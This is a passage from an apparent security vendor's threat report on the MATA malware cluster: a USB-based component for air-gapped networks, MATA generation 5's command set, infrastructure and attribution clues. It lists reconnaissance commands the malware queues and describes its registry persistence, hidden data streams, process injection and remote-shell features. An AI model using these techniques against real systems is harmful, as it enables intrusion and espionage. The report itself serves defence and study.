transporting data collected\nby the malware on the infected system, which is also done via USB. In our opinion, this component\nis used by attackers to infiltrate systems that are air-gapped from subnets that have access to\nthe internet, since such systems usually store the most sensitive information.\n\nThe second file we found was a new variant of the MATA malware, apparently written from scratch.\nWe named it MATA gen.5. Like previous generations, it has extensive remote control capabilities over\nthe infected system, has a modular architecture, and provides attackers with the ability to connect to\ncontrol servers using various protocols, as well as supporting proxy server chains.\n\nIn the next chapter we will take a closer look at these two findings.\n\n36\n\n\n-----\n\n### Spreading using removable media\n\nIn the course of our research, we also found a malware installer which reads the configuration\nfile C:\\ProgramData\\Intel\\drivers\\conf32.dat and extracts the path to a directory from it\n(presumably, the directory of a legitimate program selected in advance).\n\nThis installer then searches the directory for an executable file with the .exe extension. Once the\nfile is found, the installer creates a copy of C:\\ProgramData\\Intel\\drivers\\source32.db in the same\ndirectory, appending a pseudorandom number to the original file name. The newly created copy of\n```\nsource32.db is then used to replace the original executable found in the directory. To make the\n\n```\nreplacement file appear legitimate, all the resources of the original file, including icons and version\ninformation, are copied to the replacement file. The installer then sets the timestamps in the\nreplacement file to be identical to those read from the original file prior to replacing it.\n\nFig. 9 Code for acquiring and patching PE metadata\n\nCuriously, the malware installer logs its operations, saving the log file at the following path:\nC:\\ProgramData\\Intel\\drivers\\srwd32.dat.\n\nDuring the execution of the replaced executable, it performs a check to see if the file\nC:\\Users\\public\\CrashHandler.dmp exists. If it does not exist, which indicates that the malware is\nrunning for the first time, the executable proceeds to copy itself to two different paths:\n%TEMP%\\vcredist_x86_%RND%.exe and C:\\Users\\public\\CrashHandler.exe. It then executes the\nfile %TEMP%\\vcredist_x86_%RND%.exe, passing the original file name as a command line\nargument.\n\nOnce this is completed, the new instance of the malware process overwrites the first 16384 bytes\nof the original file with random data and attempts to execute the damaged file using Windows\nExplorer (explorer.exe). We believe that the attackers implemented this logic intentionally to\ndisplay an error message to the user stating that the file is damaged, in order to remove any\nsuspicion from the user as to why the expected legitimate program window failed to appear, since\nthe user ran the malware believing that they were launching legitimate software, and that the\nmalware had replaced the executable file of the legitimate software with the malicious executable.\n\n37\n\n\n-----\n\nAfter infecting the system, the malware proceeds to perform several actions. Firstly, it creates\ntwo hidden files named .thumbs.db and \\System Volume Information.thumbs.db on all removable\ndrives that are connected to the infected system. It then sets the Hidden and System attributes\nfor these files to hide them from the user. Additionally, the malware creates the file\nC:\\Users\\public\\CrashHandler.dmp and a mutex named _desktop45678fo2, which it uses to track\nthe system's status of being infected.\n\nTo ensure persistence, the malware creates the registry value UserInitMprLogonScript in the key\nHKEY_CURRENT_USER\\Environment\\ and sets the path to the file\nC:\\Users\\public\\CrashHandler.exe as its value. This ensures that the malware runs every time the\nuser logs in. The malware then creates the directory %APPDATA%\\DameWareNT. If the creation\nof this directory fails, the malware uses the directory %TEMP%\\DameWareNT instead.\n\nIn the newly-created DameWareNT folder, a file named data_0 is created. The file contains a\nVictimID string, which consists of eight random characters. If the file already exists, it is cleared,\nwith the exception of the first line, retaining the previously created VictimID. Next, the following\ncommands are appended to the file, encrypted using XOR key 0xA5:\n```\n cmd.exe /c ipconfig /all\n cmd.exe /c tasklist /svc\n cmd.exe /c netstat -ano\n cmd.exe /c systeminfo\n cmd.exe /c arp -a\n cmd.exe /c net use\n cmd.exe /c net user /domain\n cmd.exe /c net group /domain\n cmd.exe /c query user\n\n```\nFinally, the malware starts two threads:\n\nThe malware's first thread runs a check every three seconds to determine if the number of\nconnected removable drives has changed. If a change is detected, the following actions are\nperformed:\n\n - The drive is searched for the presence of either the file desktop.ini:_FLG:$DATA (the ‘:’\ncharacter in the file name indicates that NTFS alternate data streams are used) or the file\nSystem Volume Information\\_WFConfig.log (in case of a FAT-formatted drive). If found,\nthe data in the file is appended to the contents of the data_0 file.\n\n - Files with the .res extension in the DameWareNT directory are scanned, and their contents\nare copied to the removable drive in a file named either\ndesktop.ini:BYTES%VictimID%:$DATA (for NTFS) or System Volume\nInformation_WTSettings_%VictimID%.log (for FAT).\n\n - The drive is searched for the file desktop.ini:IDX%VictimID%:$DATA (for NTFS) or System\nVolume Information_WRConfig_%VictimID%.log (for FAT). If found, the data in the file is\nadded to the contents of the data_0 file.\n\n38\n\n\n-----\n\nThe second thread of the malware performs the following operation every 3 seconds:\n\n  - Execute the next command in the aforementioned data_0 file, starting from the second\nline onwards. The commands are first decrypted using XOR key 0xA5 and then deleted\nfrom the file after execution.\n\n  - The command’s output is also saved 0xA5 XOR’ed to all connected removable drives in the\nfile desktop.ini:_BITS_%VictimID%:$DATA (in the case of NTFS) or System Volume\nInformation\\_WRSettings_%VictimID%.log (in the case of FAT). If there are currently no\nattached removable drives, the results of the command are encrypted using XOR with the\nkey 0xA5 and saved to the file _%VictimID%.res in the DameWareNT folder.\n\nBelow we provide an overview of the various files used by this malware, their path and purpose:\n\nPath Filename Purpose\n```\n                                      Contains the ID of the\n  %APPDATA%\\DameWareNT\\ infected system, as\n  or data_0 well as a list of\n                                      commands to be executed\n  %TEMP%\\DameWareNT\\\n                                      by the malware\n               desktop.ini:_FLG:$DATA\n               System Volume Information\\_WFConfig.log Contains encrypted\n               desktop.ini:_IDX_%VictimID%:$DATA lists of commands sent\n                                      to the infected system\n               System Volume\n               Information\\_WRConfig_%VictimID%.log\n  Removable drive's root\n               desktop.ini:_BYTES_%VictimID%:$DATA\n               System Volume\n                                      Contain the results of\n               Information\\_WTSettings_%VictimID%.log\n                                      executing commands on\n               desktop.ini:_BITS_%VictimID%:$DATA\n                                      the infected system\n               System Volume\n               Information\\_WRSettings_%VictimID%.log\n\n```\nBased on all of the above, we believe that this malware is designed to validate victims and control\nmalware over air-gapped networks. This is achieved by exchanging encrypted lists of commands\nand results of executing them via removable drives. It is worth noting that the use of removable\ndrives to exchange data between the infected systems and the attackers is a less reliable method\ncompared to network communication, since it’s likely that the infected USB stick may not be\nconnected to the intended system. We believe that the attackers may not have been able to\nestablish direct network communication channels with the infected systems.\n\nNeither the original installer of this malware component nor the module that sends the data\ncollected to the malware C2 server have been identified at the time of writing. However, we\ncontinue our research and will release updates as new information becomes available.\n\n39\n\n|Path|Filename|Purpose|\n|---|---|---|\n|%APPDATA%\\DameWareNT\\ or %TEMP%\\DameWareNT\\|data_0|Contains the ID of the infected system, as well as a list of commands to be executed by the malware|\n|Removable drive's root|desktop.ini:_FLG:$DATA System Volume Information\\_WFConfig.log desktop.ini:_IDX_%VictimID%:$DATA System Volume Information\\_WRConfig_%VictimID%.log|Contains encrypted lists of commands sent to the infected system|\n||desktop.ini:_BYTES_%VictimID%:$DATA System Volume Information\\_WTSettings_%VictimID%.log desktop.ini:_BITS_%VictimID%:$DATA System Volume Information\\_WRSettings_%VictimID%.log|Contain the results of executing commands on the infected system|\n\n\n-----\n\n### MATA generation 5\n\nMATA generation 5 is a DLL that serves both as a service running within the svchost.exe process,\nor as a standard DLL that can be loaded into an arbitrary process. Its main functionality may be\ninitiated from DllEntryPoint as well as from its exported functions: ServiceMain and AsyncLoadDB.\n\nMATA-5 features a unique architecture that warrants explanation. The malware uses a multi-user\naccess concept: it assigns a unique ClientId to each connected operator or C2 server, while a\nClient with a zero ID (Client0) is reserved for the malware itself and is utilized for sending\ncommands between different components of the malware.\n\nAlthough MATA-5 is contained within a single binary, it can be divided into two logical parts that\nare interconnected through a form of Inter-Process Communication (IPC) channel. It is probable\nthat the malware was originally intended to operate in two separate processes: one responsible\nfor communication with the external world, and the other serving as a hidden component.\n\nThe architecture of MATA5 involves the utilization of loadable modules and embedded plugins.\nThese modules are required to have an exported function named “Initialize” and can contain\nmultiple plugins within them. Embedded modules can be easily identified by their “Initialize” export\nreference:\n\n - Buffer-box handler - Buffer-box serves as a shared message storage across various\nmodules. It acts as a compact list with a maximum capacity of 16 entries, accommodating\nincoming commands and outgoing messages. Each item in the Buffer-box is identified by\nthe respective ClientID and ModuleID to which the message is designated\n\n - Two IPC Channel implementations named “embed” and “udp” - the “embed” channel\nfunctions as a simple loopback interface, essentially consisting of two FIFO queues. On the\nother hand, the “udp” channel uses UDP/IP bound to real loopback network interface\n(localhost, 127.0.0.1) or any other local IP address available to bind socket\n\n - Plugins with IDs - ID numbers 17, 18, and 19, which primarily serve as command handlers on\none side of the IPC channel. These plugins handle specific commands denoted by codes\nsuch as 06x, 071, 2xx, 3xx, and 4xx\n\n - Module responsible for monitoring tasks handling - handles commands labeled with codes\nstarting with 04x\n\nAs with previous MATA generations, we see a rich set of protocols implemented, including those\nthat are reserved for future versions. These protocols encompass various functionalities, catering\nto both C2 server communication and operator connections. All of them support both passive and\nactive connection modes:\n\n - tcp - no encrypted TCP connection\n\n - ssl - TLS over TCP with using latest available beta version of openssl lib (v. 3.1.0) at the\nimplant’s detection date\n\n - pssl - TLS over TCP, with proxy support\n\n40\n\n\n-----\n\n - pdtls - TLS encryption over custom UDP transport, with proxy support\n\n - and protocols recognized by C2 descriptor parser but not implemented: ptcp, pudp, phttp,\nphttps, dtls, udp, http and https\n\nProtocols beginning with the letter ‘p’ (e.g. pssl and pdtls) support proxy-chaining via other victims\ninfected with the same malware. This feature is built into these protocols and does not require\nadditional commands to be sent to chain members. To establish a proxy chain, the initial message\nafter the connection must include the \"CONNECT\" string, followed by a list of proxy targets. The\nlength of these proxy chains is limited by the 4KB buffer containing the chain nodes list.\n\nProxy servers protocols which are usually part of victim LAN-WAN gate may be utilized for\noutgoing connections:\n\n - socks4 - SOCKS4a proxy\n\n - socks5 - SOCKS5 with GSSAPI or username/password authentication\n\n - web - HTTP proxy with Basic authorization\n\n - ntlm - HTTP proxy with NTLM authorization\n\n - ssh - not implemented\n\n - rdp - not implemented\n\nWe noticed a few protocols mentioned in the protocol’s parser function which we couldn't\nrecognize or see being implemented: pdns, snc, sweb, ssocks4, ssocks5, stelnet.\n\nUpon execution, the malware decrypts a hardcoded blob as well as a file that contains the\nconfiguration settings. These are encrypted using a combination of XOR and AES encryption.\nBelow are noteworthy configuration parameters contained in that file:\n\nConfig value Description\n\n`embed://0` IPC Channel URI\n\nC2 URI. This sample is configured to work as a server\n\n`pssl://0.0.0.0:47002` listening for incoming TLS encrypted connection on TCP\n\nport 47002, also able to act as proxy\n\n`c:\\windows\\system32\\hspfw.dll.mun` Configuration file keeps volatile settings\n\n`%TEMP%\\vi0xll3m.hat` Log file of monitoring plugin\n\n**Mata gen.5 commands**\n\nThe dedicated thread on the side “B” of the IPC channel extracts messages from Buffer-box and\nhandles the following commands:\n\n41\n\n|Config value|Description|\n|---|---|\n|embed://0|IPC Channel URI|\n|pssl://0.0.0.0:47002|C2 URI. This sample is configured to work as a server listening for incoming TLS encrypted connection on TCP port 47002, also able to act as proxy|\n|c:\\windows\\system32\\hspfw.dll.mun|Configuration file keeps volatile settings|\n|%TEMP%\\vi0xll3m.hat|Log file of monitoring plugin|\n\n\n-----\n\n|Command|Description|\n|---|---|\n|0x000 0x003|Connects to the C2 server by inserting command 0x020 with the currently configured C2 list to Buffer-box|\n|0x001|Starts a new client session that handles commands (0x06x, 0x071, 0x2xx, 0x3xx, 0x4xx) from Buffer-box|\n|0x002|Disconnects from the C2 server by inserting command 0x060 to Buffer-box|\n|0x004 0x006|Schedule reconnect by inserting command 0x021 (stop) and command 0x049 to schedule command 0x003 (connect), after specified delay, to Buffer-box|\n|0x005|Stop until reboot. Insert commands 0x021 and 0x060 to Buffer-box, then exit process|\n|0x007|Returns following info: ● Computer and user names ● Malware version (1000) ● VictimID ● IPC-channel URI ● Xor and AES keys used for config encryption ● Something named arch with value 0x100 ● Plugins file paths from config file (in this case all plugins are embedded into one binary) named as following: module_event, module_apu, module_ipc, module_monitor, module_net|\n|0x008|Refresh working configuration settings from the default hard-coded copy and configuration file|\n|0x009|Save current configuration settings to file|\n|0x00a|Delete configuration file|\n|0x00b|Return configuration file path|\n|0x00c|Return configuration settings|\n|0x00d|Set new configuration settings: VictimID, C2 connection attempts max fail count, C2 connection interval, lists of proxy and C2 servers|\n|0x00e|Return list of currently configured C2 servers|\n|0x00f|Set new list of C2 servers|\n\n\n42\n\n\n-----\n\n|0x010|Probe connection to new C2 servers list by inserting to Buffer-box command 0x022 with currently configured proxies and received C2 servers list|\n|---|---|\n\n\nThe following commands are handled by the another part of the malware - side “A”:\n\nCommand Description\n\nThe arguments of this command is a configuration structure that is used to initiate passive or\nactive connection to C2 server directly, via other victims and their proxies chain or via a guided\nproxy server that was launched on another victim with command 0x506, using the\n```\n 0x020\n```\naforementioned supported connection protocols. Then, all traffic from/to C2 server is\nforwarded to the A-side of IPC-Channel, then forwarded to B-side and finally inserted into\nBuffer-box.\n\nStop C2 active connections loop or server listening for incoming connections have been\n```\n 0x021\n```\ninitialized by command 0x020\n\nProbe active connection to a given C2 servers and proxy list the same way as the command\n```\n 0x022 0x020 does. This command does not establish permanent connection, just replying with error\n\n```\ncode is the link possible or not\n\nThe group of 0x03x commands are handled on different sides of the IPC channel. These appear to\nbe broken or incompletely implemented:\n\nCommand Description\n\nThis command is handled by the B-component. Start a new Client session by inserting command\n```\n         0x001 to Buffer-box. Then, a dedicated thread forwards all messages received from the IPC\n 0x030\n\n```\nchannel to Buffer-box, and outgoing messages from Buffer-box are sent to the IPC channel.\nUpon a 5 minutes timeout, it disconnects the client by inserting command 0x002 to Buffer-box\n\nA-component handler of this command is broken due to a bug. It is intended to connect to the\n```\n 0x031\n```\nC2 server and then forward traffic to IPC channel, like command 0x020 does\n\nB-component handler of this command is a hook of messages forwarding from Buffer-box to\nthe to-be-sent queue. The handler sends command 0x031 to A-component, creates a new\n\n`0x031` Client session and then starts a dedicated thread that runs a custom handler procedure\n\n(received in the command) using data that has been transferred to/from the client. Upon 5\nminutes timeout, it disconnects the client with command 0x002\n\nThis command is issued by either side of the IPC channel, but the command handler is not\n\n`0x032` implemented anywhere. According to how it's being used, it seems to be intended for\n\ndisconnecting upon a timeout\n\n43\n\n|Command|Description|\n|---|---|\n|0x020|The arguments of this command is a configuration structure that is used to initiate passive or active connection to C2 server directly, via other victims and their proxies chain or via a guided proxy server that was launched on another victim with command 0x506, using the aforementioned supported connection protocols. Then, all traffic from/to C2 server is forwarded to the A-side of IPC-Channel, then forwarded to B-side and finally inserted into Buffer-box.|\n|0x021|Stop C2 active connections loop or server listening for incoming connections have been initialized by command 0x020|\n|0x022|Probe active connection to a given C2 servers and proxy list the same way as the command 0x020 does. This command does not establish permanent connection, just replying with error code is the link possible or not|\n\n|Command|Description|\n|---|---|\n|0x030|This command is handled by the B-component. Start a new Client session by inserting command 0x001 to Buffer-box. Then, a dedicated thread forwards all messages received from the IPC channel to Buffer-box, and outgoing messages from Buffer-box are sent to the IPC channel. Upon a 5 minutes timeout, it disconnects the client by inserting command 0x002 to Buffer-box|\n|0x031|A-component handler of this command is broken due to a bug. It is intended to connect to the C2 server and then forward traffic to IPC channel, like command 0x020 does|\n|0x031|B-component handler of this command is a hook of messages forwarding from Buffer-box to the to-be-sent queue. The handler sends command 0x031 to A-component, creates a new Client session and then starts a dedicated thread that runs a custom handler procedure (received in the command) using data that has been transferred to/from the client. Upon 5 minutes timeout, it disconnects the client with command 0x002|\n|0x032|This command is issued by either side of the IPC channel, but the command handler is not implemented anywhere. According to how it's being used, it seems to be intended for disconnecting upon a timeout|\n\n\n-----\n\n**Monitoring-related commands**\n\nSimilar to MataDoor (MATA-4), MATA-5 has a set of commands responsible for event monitoring.\nThe monitoring tasks may be cached in the configuration file and restarted on malware\ninitialization. Monitoring tasks have the following common attributes:\n\n - Tasks are either 'one shot' or repeatable\n\n - Cycle timeout for repeatable tasks\n\n - Tasks are either temporal (not restarted after reboot) or permanent\n\n - Tasks either log task execution to a file or don't\n\n - Commands or messages are issued when a monitoring check passed\n\nThe monitoring-related commands are as follows:\n\nCommand Description\n\n`0x040` Delete monitoring task\n\n`0x041` Return monitoring tasks list\n\n`0x042` Add task to check if specified file or folder has appeared since previous check\n\n`0x043` Add task to check if size of specified file has changed\n\nAdd task to check if TCP connection with endpoints (specified by local/remote IP addresses\n```\n 0x044\n```\nand ports) was established\n\nAdd task to check for new servers accept TCP connection on given port have appeared in\n```\n 0x045\n```\nspecified subnet\n\n`0x046` Add task to check if specified process has started since previous check\n\n`0x047` Add task to check if number of logical drives has changed\n\n`0x048` Add task to check if number of active remote desktop sessions has grown\n\nAdd task to wait for a given time. This command is not a monitoring check like listed above, but\n```\n 0x049\n```\nused for scheduling internal commands execution using a specified delay\n\n**Plugins-related commands**\n\nMATA-5 contains five embedded plugins: #17, #18, #19, #33 and #34. As we previously mentioned,\nplugins #17-19 primarily serve as command handlers on the B-component side. The A-side of the\nIPC channel handles plugins #33 and #34, which tends to proxy capabilities.\n\nPlugins-related commands handled by the B-component are as follows:\n\n44\n\n|Command|Description|\n|---|---|\n|0x040|Delete monitoring task|\n|0x041|Return monitoring tasks list|\n|0x042|Add task to check if specified file or folder has appeared since previous check|\n|0x043|Add task to check if size of specified file has changed|\n|0x044|Add task to check if TCP connection with endpoints (specified by local/remote IP addresses and ports) was established|\n|0x045|Add task to check for new servers accept TCP connection on given port have appeared in specified subnet|\n|0x046|Add task to check if specified process has started since previous check|\n|0x047|Add task to check if number of logical drives has changed|\n|0x048|Add task to check if number of active remote desktop sessions has grown|\n|0x049|Add task to wait for a given time. This command is not a monitoring check like listed above, but used for scheduling internal commands execution using a specified delay|\n\n\n-----\n\n|Command|Description|\n|---|---|\n|0x060|Disconnects a client. Clears all messages related to the client in Buffer-box. Stops the loop handling commands related to the client. Schedules next C2 connection via command 0x003, to be issued after a minute by monitoring command 0x049|\n|0x061|Returns a list of embedded and loaded plugins on both A and B components. A-side plugins list is taken by issuing command 0x070|\n|0x062|Load plugin. There are three options: ● LoadLibrary from existing file ● Download, drop and LoadLibrary from temporary file ● Download and reflectively load plugin|\n|0x063|Unload plugin|\n|0x064|Does nothing, simply return success error code|\n|0x065|Iterator. Commands received together with this command are executed few times, each with incremented iterator value|\n|0x066|Set current directory|\n|0x071|Downloads plugin's body or file path and then inserts command 0x071 together with downloaded data to Buffer-box for A-component. Waits and and forward A-component response to the client|\n\n\nPlugins-related commands handled by the A-component are as follows:\n\nCommand Description\n\n`0x070` Return list of embedded and loaded plugins on A-side\n\n`0x071` Loads plugins the using the same three ways as command 0x062\n\n`0x072` Unloads plugin\n\nProcess management commands handled on the B-side via the embedded plugin #17 are as follows:\n\n|Command|Description|\n|---|---|\n|0x070|Return list of embedded and loaded plugins on A-side|\n|0x071|Loads plugins the using the same three ways as command 0x062|\n|0x072|Unloads plugin|\n\n|Command|Description|\n|---|---|\n|0x201|whoami. Return domain and user name currently running|\n|0x202|Return information about CPU architecture and Windows version|\n\n\n45\n\n\n-----\n\n|0x203|Return IPv4, IPv6 and MAC addresses of the victim host|\n|---|---|\n|0x204|Return same information as both 0x202 and 0x203 commands|\n|0x205|Run process with redirected stdout and stderr streams. Upload results to the client|\n|0x206|Run process|\n|0x207|Run process as user specified by session ID|\n|0x208|Run process as user with credentials: domain/username/password|\n|0x209|Run process by command line only (with ApplicationName set to NULL)|\n|0x20a|Run process by command line as user specified by session ID|\n|0x20b|Run process by command line as user with credentials: domain/username/password|\n|0x20c|Upload the detailed list of currently running processes to the client|\n|0x20d|Kill process|\n|0x20e|Return the malware and its parent process IDs|\n|0x20f|Check if process specified by PID is alive|\n|0x210|Get running process ID by executable name|\n|0x211|Inject LoadLibrary call to process specified by PID|\n|0x212|Read file from disk and inject it together with a reflective loader to process specified by PID. There is an option to use dll-hollowing trick|\n\n\nFile management commands handled on the B-side via the embedded plugin #18 are as follow:\n\n|Command|Description|\n|---|---|\n|0x301|Generate temporary file name in form %TEMP%\\\\~TFRC%8RndHex%.tmp and return it to the Client|\n|0x302|Return file metadata: name, size, attributes, timestamps|\n|0x303|Append data to text file|\n|0x304 0x305|Upload a list of logical drives or list of files in specified folder to the client|\n|0x306|Write list of files in specified folder to a file|\n\n\n46\n\n\n-----\n\n|0x307|Estimate disk space used by folder|\n|---|---|\n|0x308|Copy folder|\n|0x309|Copy file|\n|0x30a|Move file or folder|\n|0x30b|Create folder|\n|0x30c|Delete folder and all it content|\n|0x30d|Delete file|\n|0x30e|Wipe file by zeroes|\n|0x30f|Not fully implemented or disabled command. Just validates incoming arguments and returns error code|\n|0x310|Set file timestamps|\n|0x311|Make splitted to parts copy of file|\n|0x312|Join two files to the third|\n|0x313|Pack folder to a zip file with using statically linked open source library libzip|\n|0x314|Download file|\n|0x315|Upload file|\n|0x316|Get current directory|\n|0x317|Set current directory|\n|0x318|Check if file can be opened for write|\n|0x319|Upload file head (first 16 KB)|\n|0x31a|Upload file tail (last 16 KB)|\n\n\nNetwork reconnaissance commands handled on the B-side via the embedded plugin #19 are as follows:\n\nCommand Description\n\n`0x401` Probe TCP connection to specified host:port\n\n`0x402` Probe TCP connection to specified host:port and receive probed server greeting message\n\n47\n\n|Command|Description|\n|---|---|\n|0x401|Probe TCP connection to specified host:port|\n|0x402|Probe TCP connection to specified host:port and receive probed server greeting message|\n\n\n-----\n\n|0x403|ICMP-Ping probe specified host|\n|---|---|\n|0x404|Connect to Windows share with credentials: domain/username/password|\n|0x405|Disconnect Windows share|\n|0x406|Query specified or system defined DNS server for name resolution records type A or PTR|\n|0x407|Return specified host MAC address obtained by sending ARP request|\n|0x408|ipconfig. Return configuration of network interfaces|\n|0x409|Upload list of currently connected and available Windows shares|\n|0x40a|netstat. Upload list of TCP/UDP listeners and established connections endpoints together with owner process ID|\n|0x40b|Perform an arbitrary local or remote WMI query or an arbitrary WMI class/method call with specified credentials; upload results to the Client|\n\n\nActive-active proxy commands handled on the A-side via the embedded plugin #33 are as follows:\n\nCommand Description\n\nConnects to two endpoints: C2 server or another victim, directly or via proxies chain. Then\n```\n 0x501\n```\nforward traffic between them\n\nConnects to the C2 server and receives a target IP:port in the form of a SOCKS4 request. Then\n\n`0x502` connects to the target, sends SOCKS4 response to the C2 server, and forwards traffic\n\nbetween them\n\n`0x503` Same as command 0x502, but emulate SOCKS5-proxy protocol\n\n`0x504` Same as command 0x502, but emulate HTTP-proxy protocol\n\nRemote shell. Connects to C2 server and start specified process (cmd.exe by default) with\n```\n 0x505\n```\ninput/output streams redirected to server\n\n`0x506` Starts a guided proxy server using a specified protocol\n\nThe guided proxy server accepts incoming client connections. Each client must have an ID,\nrandomly generated or predefined. The server maintains three connected client lists with a quite\nshort lifetime. The server disconnects the client after the set 'lifetime' expires:\n\n - Connected-Clients-List for clients with a random ID (lifetime 80 seconds)\n\n - Reported-Clients-List for clients with random ID (lifetime 20 seconds)\n\n - Known-Connected-Clients-List for clients with a predefined ID (lifetime 80 seconds)\n\n48\n\n|Command|Description|\n|---|---|\n|0x501|Connects to two endpoints: C2 server or another victim, directly or via proxies chain. Then forward traffic between them|\n|0x502|Connects to the C2 server and receives a target IP:port in the form of a SOCKS4 request. Then connects to the target, sends SOCKS4 response to the C2 server, and forwards traffic between them|\n|0x503|Same as command 0x502, but emulate SOCKS5-proxy protocol|\n|0x504|Same as command 0x502, but emulate HTTP-proxy protocol|\n|0x505|Remote shell. Connects to C2 server and start specified process (cmd.exe by default) with input/output streams redirected to server|\n|0x506|Starts a guided proxy server using a specified protocol|\n\n\n-----\n\nThe guided proxy server is managed via the following messages, the client and server exchanges:\n\nMsgId Description\n\n`0` Success command execution reply\n\n`1` Error command execution reply\n\nReturns to the client content of Connected-Clients-List, all members of the list are moved to\n```\n 2\n```\nReported-Clients-List\n\n`3` Clear all three lists\n\n`4` Connect to the target received in this command, then forward traffic between Client and target\n\n`8` Register connected to server client in Connected-Clients-List\n\n`9` Select target from Reported-Clients-List, then forward traffic between client and target\n\n`10` Select target from Known-Connected-Clients-List, then forward traffic between client and\n\n`11` target. Register client in Known-Connected-Clients-List if target was not found\n\nProxy server commands handled on the A-side via the embedded plugin #34 are as follows:\n\nCommand Description\n\nPassive-active TCP proxy. Wait for incoming TCP connection, then TCP connects to specified\n```\n 0x601\n```\nin command target and forward traffic between them\n\n`0x602` Start SOCKS4a proxy server\n\n`0x603` Start SOCKS5 proxy server (TCPv4 only)\n\n`0x604` Start HTTP proxy server\n\nRemote shell server. Wait for incoming TCP connection, then start the specified process\n```\n 0x605\n```\n(cmd.exe by default) with input/output streams redirected to accepted connection\n\n## Victims\n\nBased on our telemetry data, we have identified over a dozen corporations in Eastern Europe\ntargeted by this campaign. The companies targeted are related to the oil and gas sector and\ndefense industry.\n\n|MsgId|Description|\n|---|---|\n|0|Success command execution reply|\n|1|Error command execution reply|\n|2|Returns to the client content of Connected-Clients-List, all members of the list are moved to Reported-Clients-List|\n|3|Clear all three lists|\n|4|Connect to the target received in this command, then forward traffic between Client and target|\n|8|Register connected to server client in Connected-Clients-List|\n|9|Select target from Reported-Clients-List, then forward traffic between client and target|\n|10 11|Select target from Known-Connected-Clients-List, then forward traffic between client and target. Register client in Known-Connected-Clients-List if target was not found|\n\n|Command|Description|\n|---|---|\n|0x601|Passive-active TCP proxy. Wait for incoming TCP connection, then TCP connects to specified in command target and forward traffic between them|\n|0x602|Start SOCKS4a proxy server|\n|0x603|Start SOCKS5 proxy server (TCPv4 only)|\n|0x604|Start HTTP proxy server|\n|0x605|Remote shell server. Wait for incoming TCP connection, then start the specified process (cmd.exe by default) with input/output streams redirected to accepted connection|\n\n\n49\n\n\n-----\n\n## Malicious infrastructure\n\nThe attacker used commercial hosting servers for this campaign, with most domains and malware\nhosting URLs being only online for a short time. This indicates that they had good operational\nsecurity and were able to switch their C2 servers quickly to avoid detection. They also did not rely\non any specific VPS/IPS vendors, using servers belonging to various companies such as OVH,\nM247, CrownCloud, SPRINT, Shinjiru Technology, Hydra Communications, and Linode. Avoiding\ndependence on a single vendor makes it difficult to shut down their servers.\n\nThey mostly used NameCheap domain registration service and occasionally registered domains using\ndomain privacy services to maintain anonymity. We observed that most domains were registered\nsince mid-August 2022, which is consistent with the time when we first started to observe this attack.\n\n## Attribution\n\nDespite the fact that the latest generations of MATA (gen. 4 and gen. 5), which we analyzed as\npart of this investigation, are quite different from the previous ones, there are also many\nsimilarities that allow us to say that the new samples belong to the same malware cluster and are\nsimilar to the MATA samples we have seen in previous attacks. Third MATA generation, which also\ntook part in this attack, looks like a direct successor of MATA-2, inheriting a large part of the\ncodebase from it.\n\n### Same XOR key\n\nThe MATA-3 malware we analyzed in this campaign used an embedded 64-byte XOR key to\ndecrypt DLL file name and API names at the run-time. The identical XOR key was used by the old\nMATA-2 before. Although the XORing method for the encrypted strings is slightly changed, it uses\nthe same 64-byte XOR key:\n\n  - XOR key: 33 53 8B D0 9B C4 B1 B7 FD DD 1F F8 DA C1 EB C5 F3 E7 F4 BE FB E2 F9 4E F1 DD BC BE DB 7D FA\nE2 E9 FE F3 FD A7 CF F7 76 BF DB D9 DD 7D 8A 9F C4 F3 3F 92 29 F3 4A E3 C4 8E 84 C0 BB 8C BE 3E EE\n\n  - MD5 of old MATA-2 Orchestrator: 381321d0977ce81e07263bc6be753b85\n\n  - MD5 of new MATA-3: 4b00b6c6e4f83dcf7f53db86c883a4dc\n\n50\n\n\n-----\n\nFig. 10 Same 64 bytes XOR key\n\n### Working path and naming scheme\n\nWe discovered a similar working path. The malware author behind this malware cluster used the\nsimilar 'million' path as seen in previous MATA research. Also, part of the path has changed from\n'mata2020' to 'mata2022', suggesting the MATA malware we analyzed in this campaign is an\nupdated version stemming from the same development environment.\n\nType Working path\n\nd:\\million_t\\mata2020\\mata.release\\mata_net\\matanet\\\nOrchestrator\necdh.c\n\nPrevious MATA 2\n\nD:\\Million_T\\MATA2020\\mata.release\\mata_bin\\plugin\\wi\nProcess-related plugin\nndows\\t_process_v2001_windows_intel_x64_le.pdb\n\ny:\\million_utils\\screencapture\\windows\\screencapture\\mi\nScreenshoter\nnz.c\n\nLatest MATA 3\n\nLinux MATA /home/million/mata2022/mata_t/../mata_lib\n\nMoreover, information on which platform the malware targets is now stored in MATA DLL's\ninternal filename. In the previous MATA plugin, the PDB path contained that information:\n\n  - `DLL name this case: MATA_DLL_DLL_PACK_20220829_009_win_intel_64_le_RELEASE.dll`\n\n  - `PDB path from previous MATA plugin:`\n```\n    D:\\Million_T\\MATA2020\\mata.release\\mata_bin\\plugin\\windows\\t_process_v2001_windows_int\n    el_x64_le.pdb\n\n```\nTo further elaborate on the MATA malware's development process, it appears that the malware\nauthor not only generates DLL files but also executable MATA binaries. The internal DLL name\ncontains a date that indicates frequent updates to the malware's capabilities. The number next to\nthe date represents the version of the MATA malware, which indicates that the malware was\nupdated from version 9 to version 11 in just a month and a half:\n```\n MATA_DLL_DLL_PACK_20220829_009_win_intel_64_le_RELEASE.dll\n MATA_DLL_DLL_PACK_20220905_009_win_intel_64_le_RELEASE.dll\n\n```\n51\n\n|Type|Col2|Working path|\n|---|---|---|\n|Previous MATA 2|Orchestrator|d:\\million_t\\mata2020\\mata.release\\mata_net\\matanet\\ ecdh.c|\n||Process-related plugin|D:\\Million_T\\MATA2020\\mata.release\\mata_bin\\plugin\\wi ndows\\t_process_v2001_windows_intel_x64_le.pdb|\n|Latest MATA 3|Screenshoter|y:\\million_utils\\screencapture\\windows\\screencapture\\mi nz.c|\n||Linux MATA|/home/million/mata2022/mata_t/../mata_lib|\n\n\n-----\n\n```\n MATA_EXE_DLL_PACK_20220905_009_win_intel_64_le_RELEASE.dll\n MATA_EXE_DLL_PACK_20220913_009_win_intel_64_le_RELEASE.dll\n MATA_DLL_DLL_PACK_20221003_010_win_intel_64_le_RELEASE.dll\n MATA_DLL_DLL_PACK_20221006_011_win_intel_64_le_RELEASE.dll\n MATA_DLL_DLL_PACK_20221013_011_win_intel_64_le_RELEASE.dll\n\n### Korean font in malicious documents\n\n```\nMost of the malicious Word documents contain a Korean font called Malgun Gothic (맑은 고딕),\n\nwhich means the developer is familiar with Korean or uses a 